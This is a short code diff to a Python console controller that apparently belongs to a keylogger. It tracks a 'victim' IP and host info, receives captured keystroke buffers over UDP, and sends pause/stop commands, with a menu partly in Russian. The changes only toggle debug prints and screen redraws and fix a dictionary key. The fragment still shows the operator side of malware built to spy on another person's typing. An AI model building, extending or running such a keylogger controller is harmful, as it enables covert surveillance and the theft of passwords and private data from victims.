@@ -88,9 +88,9 @@ class ControllerServer:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
                         self.info_victim = data_str
-                        # print(line)
-                        # print(self.info_victim)
-                        # print(line)
+                        print(line)
+                        print(self.info_victim)
+                        print(line)
                         continue
 
                     if signal:
@@ -99,7 +99,7 @@ class ControllerServer:
                         # print("\033[32m" + banner + "\033[0m")
                         # print(self.info_victim)
                         # print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
-                        # print("Keystroke operation ->", self.buffer)
+                        print("Keystroke operation ->", self.buffer)
                         # print("Enter 'stop' to stop, 'exit' to quit... ->")
                     else:
                         # os.system('clear')
@@ -156,11 +156,11 @@ class ConsoleMenu:
         footer = "↑↓ Переключить пункт • Enter Подтвердить"
         padding = (menu_width - len(footer)) // 2
         print("┃" + " " * padding + footer + " " * padding + " ┃")
-        #print("┗" + "━" * menu_width + "┛")
-        print("┣" + "━" * menu_width + "┫")
-        print(controller.info_victim)
         print("┗" + "━" * menu_width + "┛")
-        print(controller.buffer)
+        # print("┣" + "━" * menu_width + "┫")
+        # print(controller.info_victim)
+        # print("┗" + "━" * menu_width + "┛")
+        # print(controller.buffer)
     
     # def handle_input(self):
     #     if keyboard.is_pressed('up'):
@@ -182,7 +182,7 @@ class ConsoleMenu:
             controller.buffer = ""
         if option == 1: 
             if self.options[1] == "Pause":
-                self.options[1] = f"{self.pause_continue['continue']}"
+                self.options[1] = f"{self.pause_continue['Continue']}"
                 controller.send_command("stop")
             else:
                 self.options[1] = f"{self.pause_continue['Pause']}"
@@ -198,15 +198,13 @@ class ConsoleMenu:
                 self.current_selection = (self.current_selection + 1) % len(self.options)
             elif key == Key.enter:
                 self.execute_selection()
-            # self.clear_screen()
-            # self.draw_menu()
+            self.clear_screen()
+            self.draw_menu()
         except AttributeError:
             pass
 
     def on_release(self, key):
         try:
-            self.clear_screen()
-            self.draw_menu()
             if key == Key.esc or not self.running:
                 exit()
                 return False
